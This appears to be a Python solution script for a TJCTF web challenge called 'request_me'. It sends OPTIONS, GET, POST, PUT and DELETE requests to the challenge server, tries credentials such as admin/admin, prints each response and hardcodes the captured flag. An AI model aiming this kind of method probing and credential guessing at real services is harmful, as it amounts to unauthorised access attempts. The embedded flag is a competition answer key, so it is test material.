#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import requests
import re

url = 'https://request_me.tjctf.org/'
username = 'okulkarni'
password = 'password'

flag='tjctf{wHy_4re_th3r3_s0_m4ny_Opt10nS}'

session = requests.Session()
opcoes = session.options(url)
get = session.get(url, auth = (username, password))
post = session.post(url, data = {"username" : "admin", "password" : "admin"})
put = session.put(url, data = {"username" : "admin", "password" : "admin"})
delete = session.delete(url)

print("OPTIONS")
print(opcoes.text)
print("="*30)
print("COOKIES")
print(session.cookies)
print("="*30)
print("GET")
print(get.text)
print("="*30)
print("POST")
print(post.text)
print("="*30)
print("PUT")
print(put.text)
print("="*30)
print("DELETE")
print(delete.text)
